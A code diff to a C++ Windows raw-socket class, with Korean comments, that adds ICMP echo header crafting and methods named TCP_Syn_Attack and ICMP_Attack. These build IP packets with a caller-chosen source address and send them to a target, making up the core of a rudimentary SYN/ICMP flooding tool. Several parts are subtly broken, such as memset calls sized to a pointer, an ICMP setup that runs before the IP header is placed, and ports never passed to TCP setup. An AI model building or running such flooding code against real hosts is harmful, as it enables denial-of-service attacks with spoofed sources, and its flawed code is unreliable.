@@ -14,6 +14,7 @@
 #define IP_VERSION_AND_HDRLEN_BIT		0b01000101
 #define IP_FRAGMENT_BIT					0b0000001000000000
 #define TCP_REGISTER_BIT				0b1000000000000010
+#define ICMP_ID							0b00000000000000010000000100000000
 
 typedef struct IPHEADHER {
 	unsigned char		ip_VersionAndHdrLen;
@@ -39,6 +40,15 @@ typedef struct TCPHEADER {
 	unsigned short urgentPtr;
 }tcp_hdr;
 
+typedef struct ICMPHEADER {
+	unsigned char		icmp_Type;
+	unsigned char		icmp_Code;
+	unsigned short		icmp_Checksum;
+	unsigned int		icmp_ID;
+	unsigned int		icmp_Seq;
+	unsigned int		data[7];
+}icmp_hdr;
+
 class RawSocket {
 private:
 	WSADATA wsaData;
@@ -47,18 +57,20 @@ private:
 	WORD wsaVersion = MAKEWORD(2, 2);
 	BOOL optival = TRUE;
 	int payLoad = 512;
-	char startBuf[1000],* data;
+	char startBuf[1000], * data;
 	ip_hdr* ipHdr;
 	tcp_hdr* tcpHdr;
+	icmp_hdr* icmpHdr;
 
 public:
-	RawSocket(const char* srcIP , const char* dstIP, const int srcPort, const int dstPort) {
-
-		//tcp, ip 헤더 동적 할당
+	RawSocket(const char* srcIP, const char* dstIP, int protocol = IPPROTO_ICMP) {
+		
+		if (protocol == IPPROTO_ICMP)		IcmpSetting();
+		else if (protocol == IPPROTO_TCP)	TcpSetting();
+		
+		//ip 헤더 동적 할당
 		ipHdr = new ip_hdr;
 		memset(ipHdr, 0, sizeof(ipHdr));
-		tcpHdr = new tcp_hdr;
-		memset(tcpHdr, 0, sizeof(tcpHdr));
 
 		//Winsock 준비(초기화)
 		auto result = WSAStartup(wsaVersion, &wsaData);
@@ -73,20 +85,15 @@ public:
 			printf("소켓 초기화 실패 \n");
 			exit(1);
 		}
-		
+
 		//RawSocket IP, TCP 헤더 자동생성 방지 옵션 추가
 		setsockopt(rawSock, IPPROTO_IP, IP_HDRINCL, (char*)&optival, sizeof(optival));
-		
-		//Port 번호 범위 체크
-		if ((0 > srcPort && MAXPORT < srcPort) || (0 > dstPort && MAXPORT < dstPort)) {
-			printf("포트가 범위 안에 들지 않습니다. \n");
-			exit(01);
-		}
 
 		//목적지 정보 설정
 		dstAddr.sin_family = AF_INET;
 		inet_pton(AF_INET, dstIP, &dstAddr.sin_addr);
-		dstAddr.sin_port = htons(dstPort);
+		dstAddr.sin_port = htons(0);
+
 
 		//IP 헤더 값 설정
 		ipHdr = (ip_hdr*)startBuf; //sendto로 데이터를 보내기 위해 버퍼 주소 값으로 설정
@@ -96,7 +103,7 @@ public:
 		ipHdr->ip_TTL = 8;
 		ipHdr->ip_ID = htons(2);
 		ipHdr->ip_Fragment = IP_FRAGMENT_BIT;
-		ipHdr->ip_Protocol = IPPROTO_TCP;
+		ipHdr->ip_Protocol = protocol;
 		ipHdr->ip_CheckSum = 0;
 		//IP 등록
 		ipHdr->ip_SrcIP = inet_addr(srcIP);
@@ -110,10 +117,50 @@ public:
 		printf("SrcIP : %s \n", checkIP);
 		*/
 
+		
+	};
+
+	void TCP_Syn_Attack() {
+		int size = sizeof(*ipHdr) + sizeof(*tcpHdr) + payLoad;
+		auto result = sendto(rawSock, startBuf, size, 0, (sockaddr*)&dstAddr, sizeof(dstAddr));
+		if (result == SOCKET_ERROR) {
+			printf("RawSocket sendto Error \n");
+			exit(1);
+		}
+	};
+
+	void ICMP_Attack() {
+		int size = sizeof(*ipHdr) + sizeof(*icmpHdr);
+		auto result = sendto(rawSock, startBuf, size, 0, (sockaddr*)&dstAddr, sizeof(dstAddr));
+		if (result == SOCKET_ERROR) {
+			printf("RawSocket sendto Error \n");
+			exit(1);
+		}
+
+		printf("[SYSTEM - SENDED_BYTE] : %d Bytes\n", result);
+	};
+
+private:
+	void TcpSetting(const int srcPort = 0, const int dstPort = 0) {
+
+		printf("[SYSTEM - PROTO] : TCP Ready ... \n");
+		tcpHdr = new tcp_hdr;
+		memset(tcpHdr, 0, sizeof(tcpHdr));
+
+		//Port 번호 범위 체크
+		if ((0 > srcPort && MAXPORT < srcPort) || (0 > dstPort && MAXPORT < dstPort)) {
+			printf("포트가 범위 안에 들지 않습니다. \n");
+			exit(01);
+		}
+
+		//목적지 포트 설정
+		dstAddr.sin_port = htons(dstPort);
+
 		//TC 헤더 값 설정
 		tcpHdr = (tcp_hdr*)(startBuf + sizeof(*ipHdr));
 		tcpHdr->reg = TCP_REGISTER_BIT;
 		tcpHdr->checkSum = 0;
+
 		//TCP 등록
 		tcpHdr->tcp_SrcPort = htons(srcPort);
 		tcpHdr->tcp_DstPort = htons(dstPort);
@@ -125,17 +172,29 @@ public:
 
 		//data 주소 값 입력
 		data = startBuf + sizeof(*ipHdr) + sizeof(*tcpHdr);
-	};
 
-	void Attack() {
-		int size = sizeof(*ipHdr) + sizeof(*tcpHdr) + payLoad;
-		auto result = sendto(rawSock, startBuf, size, 0, (sockaddr*)&dstAddr, sizeof(dstAddr));
-		if (result == SOCKET_ERROR) {
-			printf("RawSocket sendto Error \n");
-			exit(1);
-		}
-	};
-	
+		printf("[SYSTEM - PROTO] : TCP Complete \n");
+	}
+
+	void IcmpSetting() {
+		printf("[SYSTEM - PROTO] : ICMP Ready ... \n");
+		icmpHdr = new icmp_hdr;
+		int icmpSize = sizeof(*icmpHdr);
+
+		memset(icmpHdr, 0, icmpSize);
+
+		icmpHdr = (icmp_hdr*)(startBuf + sizeof(*ipHdr));
+		icmpHdr->icmp_Type = 8;
+		icmpHdr->icmp_Code = 0;
+		icmpHdr->icmp_Checksum = 0;
+		icmpHdr->icmp_ID = ICMP_ID;
+		icmpHdr->icmp_Seq = 0;
+		/* ICMP Header Size 체크용
+		printf("[SYSTEM  - SIZE] : icmp - %d \n", sizeof(*icmpHdr));
+		*/
+		printf("[SYSTEM - PROTO] : ICMP Complete \n");
+	}
+
 	void ShowSocketAddr() {
 		printf("ipHdr Address : %x \n", ipHdr);
 		printf("tcpHdr Address : %x \n", tcpHdr);
